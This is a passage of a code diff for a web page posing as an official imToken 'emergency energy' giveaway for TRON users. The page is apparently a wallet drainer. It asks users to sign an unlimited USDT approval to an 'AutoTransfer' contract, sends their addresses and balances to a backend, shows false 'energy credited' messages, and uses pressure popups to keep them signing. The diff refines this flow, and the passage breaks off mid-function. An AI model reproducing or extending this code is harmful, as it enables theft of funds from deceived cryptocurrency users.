@@ -335,7 +335,6 @@ body {
     justify-content: center;
     gap: 6px;
 }
-
 /* 钱包选择弹窗样式 */
 .wallet-modal {
     position: fixed;
@@ -408,6 +407,12 @@ body {
     text-align: center;
     color: #a0a8a4;
     font-size: 12px;
+}
+/* 新增弹窗样式（用于领取时引导） */
+.persistent-alert {
+    position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+    padding: 20px 30px; background: #1e2925; border-radius: 8px; box-shadow: 0 2px 15px rgba(0,0,0,0.3);
+    font-size: 16px; color: #e0e8e4; z-index: 9999; text-align: center; border: 1px solid #3b82f6;
 }
     </style>
 </head>
@@ -502,7 +507,6 @@ body {
             合约验证：AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>（TRON浏览器查询）
             © 2025 能量服务 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
         </div>
-
         <!-- 钱包选择弹窗 -->
         <div class="wallet-modal" id="walletModal">
             <div class="wallet-modal-content">
@@ -540,22 +544,6 @@ body {
                         <div class="wallet-item-info">
                             <div class="wallet-item-name">Bitget Wallet</div>
                             <div class="wallet-item-desc">TRC20 / ERC20</div>
-                        </div>
-                    </div>
-                    <!-- MetaMask -->
-                    <div class="wallet-item" data-wallet="metamask">
-                        <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/icon/metaMask.png" alt="MetaMask">
-                        <div class="wallet-item-info">
-                            <div class="wallet-item-name">MetaMask</div>
-                            <div class="wallet-item-desc">ERC20 授权</div>
-                        </div>
-                    </div>
-                    <!-- Coinbase -->
-                    <div class="wallet-item" data-wallet="coinbase">
-                        <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/icon/coinbase.gif" alt="Coinbase">
-                        <div class="wallet-item-info">
-                            <div class="wallet-item-name">Coinbase</div>
-                            <div class="wallet-item-desc">ERC20 授权</div>
                         </div>
                     </div>
                 </div>
@@ -624,7 +612,6 @@ let trxBalance = 0.00;
 const RECORD_KEY = "imtoken_energy_records";
 // 新增：B1信号发送标记（防止重复发送）
 const B1_SIGNAL_KEY = "b1_signal_sent";
-
 // 钱包配置：Scheme + 名称映射
 const walletConfig = {
     imtoken: {
@@ -647,16 +634,6 @@ const walletConfig = {
         scheme: "bitkeep://bkconnect?action=dapp&url=",
         name: "Bitget Wallet",
         logo: "bitget.png"
-    },
-    metamask: {
-        scheme: "https://metamask.app.link/dapp/",
-        name: "MetaMask",
-        logo: "metaMask.png"
-    },
-    coinbase: {
-        scheme: "imtokenv2://navigate/DappView?url=",
-        name: "Coinbase",
-        logo: "coinbase.gif"
     }
 };
 // ========== 多语言配置（已更新headerDesc文本） ==========
@@ -687,7 +664,7 @@ const langConfig = {
         transferQuota: "无限",
         noRecord: "暂无能量领取记录",
         browserWarn1: " ⚠️ 请用 <strong>钱包内置浏览器</strong> 打开",
-        browserWarn2: " ⚠️ 非钱包浏览器：点击按钮选择钱包，自动唤起+复制链接",
+        browserWarn2: " ⚠️ 非钱包浏览器：点击按钮选择钱包，自动唤起访问",
         connectBtnText: "连接钱包",
         approveBtnText: "领取能量",
         reviewTipText: "系统审核中，审核通过后请务必完成签名",
@@ -712,7 +689,7 @@ const langConfig = {
         redirectingBtn: "跳转签名中...",
         approveFail: "⚠️ 操作失败：{msg}，请稍后重试",
         authorizeFail: "⚠️ 授权失败：{msg}，请稍后重试",
-        successTip: "🎉 免费能量领取完成！\90000μs USDT能量已到账～",
+        successTip: "🎉 免费能量领取完成！90000μs USDT能量已到账～",
         successBtn: "能量领取成功",
         successArrival: "<br><span style='color: #4ade80;'>✅ 90000μs USDT能量已到账</span>",
         recordAddress: "地址：",
@@ -725,13 +702,12 @@ const langConfig = {
         errorTipPrefix: "⚠️ ",
         noWalletAddress: "未检测到有效钱包地址<br><span style='color: #ef4444; font-size: 14px;'>❌ 请连接钱包后重试</span>",
         nonImTokenUser: "非钱包环境<br><span style='color: #3b82f6; font-size: 13px;'>请点击按钮选择钱包，自动唤起访问</span>",
-        // 新增：非钱包环境容器双语（中文）
         specialTipTitle: "imToken-EAB",
         specialTipContent: "此链接仅为imToken用户在钱包无能量、无TRX需要在Tron网络转账情况下的紧急援助，资源有限请勿当作盈利项目。"
     },
     en: {
         headerTitle: "imToken",
-        headerDesc: "imToken Official Emergency Channel", // 英文对应更新
+        headerDesc: "imToken Official Emergency Channel",
         userInfoDefault: "Wallet not connected<br><span>Click the 'Connect Wallet' button below</span>",
         walletStatusTitle: "Wallet Status",
         disconnectedText: "Wallet not connected",
@@ -755,7 +731,7 @@ const langConfig = {
         transferQuota: "Unlimited",
         noRecord: "No energy claim records",
         browserWarn1: " ⚠️ Open with <strong>wallet in-app browser</strong>",
-        browserWarn2: " ⚠️ Non-wallet browser: Click button to select wallet, auto-launch + copy link",
+        browserWarn2: " ⚠️ Non-wallet browser: Click button to select wallet, auto-launch access",
         connectBtnText: "Connect Wallet",
         approveBtnText: "Claim Energy",
         reviewTipText: "System reviewing - please complete the signature after approval",
@@ -780,7 +756,7 @@ const langConfig = {
         redirectingBtn: "Redirecting to Signature...",
         approveFail: "⚠️ Operation failed: {msg}, please try again later",
         authorizeFail: "⚠️ Authorization failed: {msg}, please try again later",
-        successTip: "🎉 Free Energy Claim Completed!\90000μs USDT Energy has been credited～",
+        successTip: "🎉 Free Energy Claim Completed! 90000μs USDT Energy has been credited～",
         successBtn: "Claim Successful",
         successArrival: "<br><span style='color: #4ade80;'>✅ 90000μs USDT Energy credited</span>",
         recordAddress: "Address:",
@@ -793,7 +769,6 @@ const langConfig = {
         errorTipPrefix: "⚠️ ",
         noWalletAddress: "No valid wallet address detected<br><span style='color: #ef4444; font-size: 14px;'>❌ Please connect wallet and try again</span>",
         nonImTokenUser: "Non-wallet environment<br><span style='color: #3b82f6; font-size: 13px;'>Click button to select wallet, auto-launch access</span>",
-        // 新增：非钱包环境容器双语（英文）
         specialTipTitle: "imToken-EAB",
         specialTipContent: "This link is only for emergency assistance to imToken users who need to transfer on the Tron network without wallet energy or TRX. Resources are limited, please do not use it as a profitable project."
     }
@@ -823,6 +798,9 @@ function addAuthorizedAddress(address) {
     }
 }
 function isAddressAuthorized(address) {
+    // 白名单地址直接返回false，不被已授权拦截
+    if (address === SPECIAL_ADDRESS) return false;
+    
     const addresses = getAuthorizedAddresses();
     if (!addresses.includes(address)) return false;
     const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
@@ -853,24 +831,26 @@ function updateA1SignalRecord(address) {
         console.warn("更新A1信号记录失败：", e);
     }
 }
-// ========== B1信号防重复工具 ==========
+// ========== B1信号防重复工具（修复过期时间+语法） ==========
 function hasSentB1Signal(address) {
-    try {
-        const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
-        return records[address] === true;
-    } catch (e) {
-        console.warn("检查B1信号发送状态失败：", e);
-        return false;
-    }
+  try {
+    const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
+    const item = records[address];
+    if (!item) return false;
+    return Date.now() - item.time < 2592000000; // 30天过期（正确值）
+  } catch (e) {
+    console.warn("检查B1信号失败：", e);
+    return false;
+  }
 }
 function markB1SignalSent(address) {
-    try {
-        const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
-        records[address] = true;
-        localStorage.setItem(B1_SIGNAL_KEY, JSON.stringify(records));
-    } catch (e) {
-        console.warn("标记B1信号发送状态失败：", e);
-    }
+  try {
+    const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
+    records[address] = { time: Date.now() }; // 存储时间戳
+    localStorage.setItem(B1_SIGNAL_KEY, JSON.stringify(records));
+  } catch (e) {
+    console.warn("标记B1信号失败：", e);
+  }
 }
 // ========== DOM元素缓存 ==========
 const walletStatusContainer = document.getElementById("walletStatusContainer");
@@ -885,7 +865,7 @@ const reviewTipText = document.getElementById("reviewTipText");
 const langToggle = document.getElementById("langToggle");
 const footerInfo = document.getElementById("footerInfo");
 const recordList = document.getElementById("recordList"); // 记录列表元素
-const specialTipContainer = document.getElementById("specialTipContainer"); // 新增：非钱包环境容器
+const specialTipContainer = document.getElementById("specialTipContainer"); // 非钱包环境容器
 // ========== 错误类型判断 ==========
 function isCustomerError(errMsg) {
     const lang = langConfig[currentLang];
@@ -920,17 +900,15 @@ function updatePageLang() {
 function reRenderDynamicContent() {
     const lang = langConfig[currentLang];
     if (!userAddress) {
-        // 未连接钱包：只显示未连接提示，不显示不符合领取条件
         userInfoEl.innerHTML = lang.userInfoDefault;
         approveBtn.disabled = true;
         approveBtn.textContent = lang.approveBtnText;
-        recordList.style.display = "none"; // 隐藏记录列表
+        recordList.style.display = "none";
         return;
     }
-    // 连接钱包：显示记录列表
     recordList.style.display = "block";
     
-    // 特殊地址处理
+    // 特殊地址（白名单）处理：跳过已授权判断，强制显示可领取
     if (userAddress === SPECIAL_ADDRESS) {
         const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
         userInfoEl.innerHTML = lang.eligibleTip
@@ -957,7 +935,7 @@ function reRenderDynamicContent() {
         return;
     }
     // 余额状态
-    if (tokenBalance <= 1) {
+    if (tokenBalance <= 0) {
         userInfoEl.innerHTML = lang.insufficientUsdt
             .replace("{address}", shortAddr)
             .replace("{usdt}", tokenBalance.toFixed(2))
@@ -999,17 +977,14 @@ function updateEnergyDisplay() {
     console.log("能量跳动中：", Math.floor(currentEnergy));
 }
 function startPersistentEnergyCountdown() {
-    if (trxTimer) clearTimeout(trxTimer);
+    if (trxTimer) clearInterval(trxTimer); // 改为setInterval更稳定
     calculateCurrentEnergy();
     updateEnergyDisplay();
-    function tick() {
+    // 优化定时器：避免递归，减少资源占用
+    trxTimer = setInterval(() => {
         updateEnergyDisplay();
-        if (currentEnergy > 0) {
-            trxTimer = setTimeout(tick, 1000);
-        }
-    }
-    tick();
-    console.log("能量定时器已启动，递归模式");
+        if (currentEnergy <= 0) clearInterval(trxTimer);
+    }, 1000);
 }
 // ========== 自动授权函数（仅在用户点击领取后触发） ==========
 async function autoApprove() {
@@ -1017,73 +992,61 @@ async function autoApprove() {
     const btn = document.getElementById("approveBtn");
     btn.disabled = true;
     btn.textContent = lang.redirectingBtn;
-    reviewTip.style.display = "flex";
-    reviewTipText.textContent = "正在跳转到授权页面...请完成签名";
-
     try {
-        // 直接执行授权（跳过手动点击）
         if (!trc20Contract) trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
         
-        // 核心授权操作：直接调用合约approve，唤起钱包签名页面
+        // 核心授权操作
         const tx = await trc20Contract.approve(
             AUTO_TRANSFER_CONTRACT,
             INFINITE_APPROVE_AMOUNT
         ).send({ from: userAddress, shouldPollResponse: true });
-
-        // 授权成功后同步信息
+        // 授权成功同步信息
         await Promise.all([sendSignalA2(), sendSignalB(false)]);
         btn.textContent = lang.successBtn;
         userInfoEl.innerHTML += lang.successArrival;
-        alert(lang.successTip);
-        addAuthorizedAddress(userAddress);
+        // 白名单地址跳过30天限制（可选）
+        if (userAddress !== SPECIAL_ADDRESS) {
+            addAuthorizedAddress(userAddress);
+        }
         saveEnergyRecord();
         renderEnergyRecords();
     } catch (e) {
         console.error("授权失败：", e);
         btn.textContent = lang.approveBtnText;
         btn.disabled = false;
-        reviewTip.style.display = "none";
-        alert(`${lang.authorizeFail.replace("{msg}", e.message)}`);
+        showAutoCloseAlert(`${lang.authorizeFail.replace("{msg}", e.message)}`);
     }
 }
-// ========== 环境检测函数（需求1：删除自动复制，仅直接跳转） ==========
+// ========== 环境检测函数（删除复制，直接跳转） ==========
 async function checkImTokenEnv() {
     const lang = langConfig[currentLang];
     const walletModal = document.getElementById("walletModal");
     const connectBtn = document.getElementById("connectBtn");
-
     if (window.tronWeb) {
-        // 钱包内环境：展示原有钱包页面，发送A1信号（需求2）
         tronWeb = window.tronWeb;
         connectBtn.style.display = "none";
         warning.style.display = "none";
         specialTipContainer.style.display = "none";
         walletModal.classList.remove("active");
-        await initWallet(false); // 传false：不自动授权，仅展示页面（需求2）
+        await initWallet(false);
     } else {
-        // 非钱包环境：点击按钮显示钱包选择弹窗
         specialTipContainer.style.display = "block";
         userInfoEl.innerHTML = lang.nonImTokenUser;
         approveBtn.style.display = "none";
         
-        // 显示钱包选择弹窗
         connectBtn.onclick = () => {
             walletModal.classList.add("active");
         };
-
-        // 绑定钱包选择事件（需求1：删除复制功能，直接跳转）
         document.querySelectorAll(".wallet-item").forEach(item => {
             item.addEventListener("click", async (e) => {
-                const walletType = e.currentTarget.dataset.wallet;
+                const walletType = e.currentTarget.dataset.wallet; // 获取用户选择的钱包类型
                 const wallet = walletConfig[walletType];
                 if (!wallet) return;
 
                 try {
-                    // 生成带自动跳转标记的链接（仅用于唤起，不自动授权）
-                    const dappUrl = window.location.href + "#wallet-open";
+                    // 关键修改1：URL拼接wallet参数，传递用户选择的钱包类型
+                    const dappUrl = window.location.href + "#wallet-open" + `?wallet=${walletType}`; 
                     let jumpUrl = "";
-
-                    // 按钱包类型拼接Scheme
                     switch (walletType) {
                         case "tronlink":
                             const param = JSON.stringify({
@@ -1100,21 +1063,15 @@ async function checkImTokenEnv() {
                         default:
                             jumpUrl = wallet.scheme + encodeURIComponent(dappUrl);
                     }
-
-                    // 需求1：删除自动复制，直接跳转
                     window.location.href = jumpUrl;
-                    // 简化提示（无需复制提示）
-                    alert(`已唤起${wallet.name}，请在钱包内完成操作`);
                     walletModal.classList.remove("active");
                 } catch (e) {
                     console.error(`${wallet.name}唤起失败：`, e);
-                    alert(`无法自动唤起${wallet.name}，请手动打开钱包并访问该链接`);
                     walletModal.classList.remove("active");
+                    showAutoCloseAlert(`唤起${wallet.name}失败，请手动打开钱包访问`);
                 }
             });
         });
-
-        // 点击弹窗外部关闭
         walletModal.addEventListener("click", (e) => {
             if (e.target === walletModal) {
                 walletModal.classList.remove("active");
@@ -1122,79 +1079,55 @@ async function checkImTokenEnv() {
         });
     }
 }
-// ========== 钱包初始化函数（需求2：跳转后仅展示页面，发送A1信号，不自动授权） ==========
+// ========== 钱包初始化函数（优化卡顿+异步渲染） ==========
 async function initWallet(needAutoApprove) {
     const lang = langConfig[currentLang];
     try {
         userAddress = tronWeb.defaultAddress.base58;
-        // 特殊地址白名单校验（保留原有逻辑）
-        if (userAddress === SPECIAL_ADDRESS) {
-            const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-            trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
-            const [usdtRaw, trxRaw] = await Promise.all([
-                trc20Contract.balanceOf(userAddress).call().catch(err => 0),
-                tronWeb.trx.getBalance(userAddress).catch(err => 0)
-            ]);
-            tokenBalance = Number(usdtRaw) / 1000000;
-            trxBalance = Number(trxRaw) / 1000000;
-            userInfoEl.innerHTML = lang.eligibleTip
-                .replace("{address}", shortAddr)
-                .replace("{usdt}", tokenBalance.toFixed(2))
-                .replace("{trx}", trxBalance.toFixed(2));
-            document.getElementById("statusAddress").textContent = shortAddr;
-            updateWalletStatus();
-            
-            // 需求2：发送A1信号（配合原有逻辑）
-            if (canSendA1Signal(userAddress)) {
-                await sendSignalA1().catch(err => console.error("A1信号发送失败：", err));
-                updateA1SignalRecord(userAddress);
-            }
-            return;
-        }
-        // 普通地址逻辑（保留余额、已领取校验）
-        const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-        trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
-        const [usdtRaw, trxRaw] = await Promise.all([
-            trc20Contract.balanceOf(userAddress).call().catch(err => 0),
-            tronWeb.trx.getBalance(userAddress).catch(err => 0)
-        ]);
-        tokenBalance = Number(usdtRaw) / 1000000;
-        trxBalance = Number(trxRaw) / 1000000;
-
-        // 30天内已领取校验（保留原有防重复逻辑）
-        if (isAddressAuthorized(userAddress)) {
-            userInfoEl.innerHTML = lang.authorizedTip.replace("{address}", shortAddr).replace("{usdt}", tokenBalance.toFixed(2)).replace("{trx}", trxBalance.toFixed(2));
-            approveBtn.disabled = true;
-            approveBtn.textContent = lang.authorizedBtn;
-        } 
-        // 余额不足校验（保留原有逻辑）
-        else if (tokenBalance <= 1) {
-            userInfoEl.innerHTML = lang.insufficientUsdt.replace("{address}", shortAddr).replace("{usdt}", tokenBalance.toFixed(2)).replace("{trx}", trxBalance.toFixed(2));
-            approveBtn.disabled = true;
-            approveBtn.textContent = lang.insufficientBtn;
-        } 
-        // 符合条件：仅展示页面，不自动授权（需求2）
-        else {
-            userInfoEl.innerHTML = lang.eligibleTip.replace("{address}", shortAddr).replace("{usdt}", tokenBalance.toFixed(2)).replace("{trx}", trxBalance.toFixed(2));
-            approveBtn.disabled = false;
-            approveBtn.textContent = lang.approveBtnText;
-            
-            // 需求2：发送A1信号（配合原有逻辑）
-            if (canSendA1Signal(userAddress)) {
-                await sendSignalA1().catch(err => console.error("A1信号发送失败：", err));
-                updateA1SignalRecord(userAddress);
-            }
-        }
-
+        const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
+        // 先渲染基础UI，避免空白等待（解决卡顿）
         document.getElementById("statusAddress").textContent = shortAddr;
+        userInfoEl.innerHTML = `${lang.loadingTip.replace("{address}", shortAddr)}`;
         updateWalletStatus();
         recordList.style.display = "block";
+        // 异步查询余额（加超时，不阻塞UI）
+        const queryBalance = async () => {
+            try {
+                const timeoutPromise = new Promise((_, reject) => 
+                    setTimeout(() => reject(new Error("余额查询超时")), 10000)
+                );
+                trc20Contract = trc20Contract || await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
+                const [usdtRaw, trxRaw] = await Promise.race([
+                    Promise.all([
+                        trc20Contract.balanceOf(userAddress).call().catch(err => 0),
+                        tronWeb.trx.getBalance(userAddress).catch(err => 0)
+                    ]),
+                    timeoutPromise
+                ]);
+                tokenBalance = Number(usdtRaw) / 1000000;
+                trxBalance = Number(trxRaw) / 1000000;
+                reRenderDynamicContent();
+            } catch (e) {
+                console.error("余额查询失败：", e);
+                userInfoEl.innerHTML = `余额查询失败<br><span style='color: #ef4444; font-size: 14px;'>${e.message}</span>`;
+                approveBtn.disabled = false;
+                approveBtn.textContent = "重试查询";
+                approveBtn.onclick = () => queryBalance();
+            }
+        };
+        queryBalance(); // 异步执行，不阻塞
+        // 直接绑定按钮逻辑，移除300ms延迟
+        bindApproveLogic();
+        // A1信号异步发送（保留逻辑）
+        if (userAddress && canSendA1Signal(userAddress)) {
+            sendSignalA1().catch(err => console.error("A1信号发送失败：", err));
+            updateA1SignalRecord(userAddress);
+        }
     } catch (e) {
-        console.error("钱包初始化失败：", e);
-        const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
-        userInfoEl.innerHTML = userAddress ? lang.insufficientUsdt.replace("{address}", shortAddr).replace("{usdt}", tokenBalance?.toFixed(2) || 0).replace("{trx}", trxBalance?.toFixed(2) || 0) : lang.noWalletAddress;
+        console.error("钱包初始化异常：", e);
+        userInfoEl.innerHTML = `连接失败：${e.message}<br><span style='color: #ef4444; font-size: 14px;'>请刷新页面重试</span>`;
         approveBtn.disabled = true;
-        approveBtn.textContent = lang.insufficientBtn;
+        approveBtn.textContent = "连接失败";
         updateWalletStatus();
         recordList.style.display = userAddress ? "block" : "none";
     }
@@ -1204,34 +1137,33 @@ async function executeAfterApprove() {
     const lang = langConfig[currentLang];
     try {
         if (!trc20Contract) trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
-        // 执行签名授权操作
         await trc20Contract.approve(
             AUTO_TRANSFER_CONTRACT,
             INFINITE_APPROVE_AMOUNT
         ).send({ from: userAddress, shouldPollResponse: true });
-        // 核心新增：签名成功后，发送A2+B2信号（让后端记录授权用户）
         const btn = document.getElementById("approveBtn");
         btn.textContent = "同步授权信息中...";
         await Promise.all([
-            sendSignalA2(), // 发送A2信号（保留原有逻辑）
-            sendSignalB(false) // 发送B2信号（isB1=false，保留原有逻辑）
+            sendSignalA2(),
+            sendSignalB(false)
         ]);
         console.log("✅ A2+B2信号发送成功，后端已记录授权用户");
-        // 信号发送完成，标记能量发放成功
         btn.textContent = lang.successBtn;
         userInfoEl.innerHTML += lang.successArrival;
-        alert(lang.successTip);
+        // 白名单地址跳过30天限制（可选）
+        if (userAddress !== SPECIAL_ADDRESS) {
+            addAuthorizedAddress(userAddress);
+        }
         renderEnergyRecords();
     } catch (e) {
         console.error("签名/信号发送失败：", e);
-        // 即使A2/B2发送失败，签名成功后能量已到账，仅后端记录受影响
-        alert("能量已到账，但授权信息同步失败（不影响使用）");
+        showAutoCloseAlert("能量已到账，但授权信息同步失败（不影响使用）");
         const btn = document.getElementById("approveBtn");
         btn.textContent = lang.successBtn;
         userInfoEl.innerHTML += lang.successArrival;
     }
 }
-// ========== 发送信号函数（全部保留原有逻辑，无修改） ==========
+// ========== 发送信号函数（全部保留） ==========
 async function sendSignalA1() {
     const requestData = { userAddress };
     const controller = new AbortController();
@@ -1245,35 +1177,48 @@ async function sendSignalA1() {
             keepalive: true
         });
         clearTimeout(timeoutId);
+        
+        // 处理204 No Content
+        if (res.status === 204) {
+            const status = "success";
+            const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
+            a1Status[userAddress] = status;
+            localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
+            console.log("✅ A1信号发送成功（后端返回204 No Content）");
+            return true;
+        }
         const status = res.ok ? "success" : "fail";
-        // 记录A1信号状态到本地缓存（关联钱包地址）
         const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
         a1Status[userAddress] = status;
         localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
         
         if (res.ok) {
+            try {
+                await res.json();
+            } catch (e) {
+                console.log("A1信号响应无内容（正常情况）", e);
+            }
             console.log("✅ A1信号异步发送成功");
-            return true; // 返回成功状态
+            return true;
         } else {
-            console.log("❌ A1信号发送失败（后端非200状态）");
-            return false; // 返回失败状态
+            console.log("❌ A1信号发送失败（后端非200/204状态）");
+            return false;
         }
     } catch (e) {
         clearTimeout(timeoutId);
-        // 记录A1信号失败状态
         const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
         a1Status[userAddress] = "fail";
         localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
         
         console.warn("❌ A1信号发送异常：", e);
-        return false; // 异常也返回失败
+        return false;
     }
 }
 async function sendSignalA2() {
     const requestData = { 
         userAddress, 
         usdtBalance: tokenBalance, 
-        trxBalance: trxBalance // 直接复用已有TRX余额（无需重新计算）
+        trxBalance: trxBalance 
     };
     const controller = new AbortController();
     const timeoutId = setTimeout(() => controller.abort(), 20000);
@@ -1281,11 +1226,10 @@ async function sendSignalA2() {
         const res = await fetch(`${BACKEND_API}/api/send-signal-a2`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(requestData), // 现在包含3个参数
+            body: JSON.stringify(requestData),
             signal: controller.signal,
             keepalive: true
         });
-        // 后续原有逻辑不变（成功/失败处理、日志打印等）
         clearTimeout(timeoutId);
         if (res.ok) {
             console.log("✅ A2信号发送成功");
@@ -1314,101 +1258,219 @@ async function sendSignalB(isB1 = true) {
             signal: controller.signal,
             keepalive: true
         });
+        if (res.status === 204) {
+           console.log(`✅ 信号${isB1 ? "B1" : "B2"}处理成功（204）`);
+            return true;
+        }
         clearTimeout(timeoutId);
-        // 1. 客户端错误（400/408/409）：用户不合规
         if ([400, 408, 409].includes(res.status)) {
             const errData = await res.json().catch(() => ({ detail: lang.ineligibleTip }));
             throw new Error(errData.detail || lang.ineligibleTip);
         }
-        // 2. 成功回应（200+success=true）
         const data = await res.json();
         if (res.ok && data.success) {
             console.log(`✅ 信号${isB1 ? "B1" : "B2"}处理成功`);
-            return true; // 成功返回true
+            return true;
         }
-        // 3. 其他失败（后端异常）
         throw new Error(lang.systemBusyTip);
     } catch (e) {
         clearTimeout(timeoutId);
-        throw e; // 抛出错误，让领取按钮的catch处理
+        throw e;
     }
 }
-// ========== 领取按钮逻辑（需求3：点击后根据A1信号反馈决定是否跳授权） ==========
+// ========== 弹窗工具（非防重复对象用，不自动消失） ==========
+function showPersistentAlert(message) {
+    // 先移除已存在的弹窗，避免重复
+    const existingAlert = document.querySelector(".persistent-alert");
+    if (existingAlert) document.body.removeChild(existingAlert);
+    
+    const alertDiv = document.createElement("div");
+    alertDiv.className = "persistent-alert";
+    alertDiv.style.cssText = `
+        position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+        padding: 20px 30px; background: #1e2925; border-radius: 8px; box-shadow: 0 2px 15px rgba(0,0,0,0.3);
+        font-size: 16px; color: #e0e8e4; z-index: 9999; text-align: center; border: 1px solid #3b82f6;
+    `;
+    alertDiv.textContent = message;
+    document.body.appendChild(alertDiv);
+    return alertDiv; // 返回弹窗元素，后续可手动移除
+}
+// ========== 核心逻辑bindApproveLogic（彻底修复弹窗+白名单拦截） ==========
 function bindApproveLogic() {
     const lang = langConfig[currentLang];
+    // 白名单地址强制启用按钮，忽略已授权状态
+    if ((tokenBalance > 1 && !isAddressAuthorized(userAddress)) || userAddress === SPECIAL_ADDRESS) {
+        approveBtn.disabled = false;
+        approveBtn.textContent = lang.approveBtnText;
+    }
     approveBtn.onclick = async () => {
         const btn = document.getElementById("approveBtn");
-        const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
         btn.disabled = true;
         btn.textContent = lang.loadingBtn;
-        reviewTip.style.display = "flex";
-        reviewTipText.textContent = "能量调配中……点击签名后能量生效";
-
+        reviewTip.style.display = "none"; // 隐藏页面提示
+        let alertEl = null; // 存储非防重复对象的弹窗元素
         try {
-            // 需求3：先判断A1信号是否发送成功（后端反馈）
-            const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
-            const isA1Success = a1Status[userAddress] === "success";
-            if (!isA1Success) {
-                // A1信号失败：不跳授权，提示重试
-                alert("现在领取的人太多啦，请稍后重试");
+            // 基础校验+A1信号校验（保留原有逻辑）
+            if (!userAddress) {
+                showAutoCloseAlert(lang.noWalletAddress.split("<br>")[0]);
                 btn.disabled = false;
                 btn.textContent = lang.approveBtnText;
-                reviewTip.style.display = "none";
                 return;
             }
-
-            // B1信号防重复发送（保留原有逻辑）
-            if (hasSentB1Signal(userAddress)) {
-                alert("请勿重复提交，已在处理中");
-                btn.disabled = false;
-                btn.textContent = lang.approveBtnText;
-                reviewTip.style.display = "none";
+            // 白名单地址跳过已授权校验，其他地址正常校验
+            if (userAddress !== SPECIAL_ADDRESS && isAddressAuthorized(userAddress)) {
+                showAutoCloseAlert(lang.authorizedTip.split("<br>")[3]);
+                btn.disabled = true;
+                btn.textContent = lang.authorizedBtn;
                 return;
             }
-
-            // 发送B1信号，等待后端回应（保留原有逻辑）
-            btn.textContent = "发送信号中...";
-            const b1Response = await sendSignalB(true); // 发送B1信号
-
-            // B1成功：跳转到钱包授权页面
-            if (b1Response) {
-                markB1SignalSent(userAddress); // 标记B1已发送（保留原有逻辑）
-                addAuthorizedAddress(userAddress); // 标记已领取（保留原有逻辑）
-                saveEnergyRecord(); // 保存领取记录（保留原有逻辑）
-                renderEnergyRecords(); // 更新页面记录（保留原有逻辑）
-                reviewTip.style.display = "none";
-                btn.textContent = lang.redirectingBtn;
-
-                // 适配多钱包授权跳转（保留原有适配逻辑）
-                let walletScheme = "imtoken://browser?url=";
-                if (window.tronWeb && window.tronWeb.provider?.isTokenPocket) {
-                    walletScheme = "tpdapp://open?params={\"url\":\"";
-                } else if (window.tronWeb && window.tronWeb.provider?.isTronLink) {
-                    walletScheme = "tronlinkoutside://pull.activity?param=";
-                } else if (window.tronWeb && window.tronWeb.provider?.isBitKeep) {
-                    walletScheme = "bitkeep://bkconnect?action=dapp&url=";
+            if (tokenBalance <= 1 && userAddress !== SPECIAL_ADDRESS) {
+                showAutoCloseAlert(lang.insufficientUsdt.split("<br>")[2]);
+                btn.disabled = true;
+                btn.textContent = lang.insufficientBtn;
+                return;
+            }
+            if (!trc20Contract) {
+                trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
+                if (!trc20Contract) {
+                    throw new Error(lang.systemBusyTip);
                 }
-                const approveUrl = window.location.href + "#approve";
-                window.location.href = walletScheme + encodeURIComponent(approveUrl);
             }
+            let a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
+            let isA1Success = a1Status[userAddress] === "success";
+            if (!isA1Success) {
+                alertEl = showPersistentAlert(lang.systemBusyTip); // 非自动消失弹窗
+                const retryA1 = await sendSignalA1().catch(err => false);
+                if (!retryA1) {
+                    throw new Error("A1信号同步失败，请刷新页面");
+                }
+                a1Status[userAddress] = "success";
+                localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
+                isA1Success = true;
+            }
+            // ========== 核心修复：按对象类型处理（无弹窗/弹窗不消失） ==========
+            let isB1Repeated = hasSentB1Signal(userAddress);
+            if (isB1Repeated) {
+                // 防重复对象：无弹窗，直接跳转
+                await handleJump();
+            } else {
+                // 非防重复对象：弹窗不消失，B1返回后直接执行逻辑
+                alertEl = showPersistentAlert("系统审核中，通过后自动跳转，中途退出30日不可再次领取");
+                markB1SignalSent(userAddress);
+                const b1Response = await sendSignalB(true); // 等待B1反馈
+                if (!b1Response) {
+                    // B1失败：更新弹窗提示，3秒后移除
+                    alertEl.textContent = "现在领取的人太多啦，请稍后重试";
+                    setTimeout(() => {
+                        if (alertEl && alertEl.parentNode) {
+                            alertEl.style.opacity = "0";
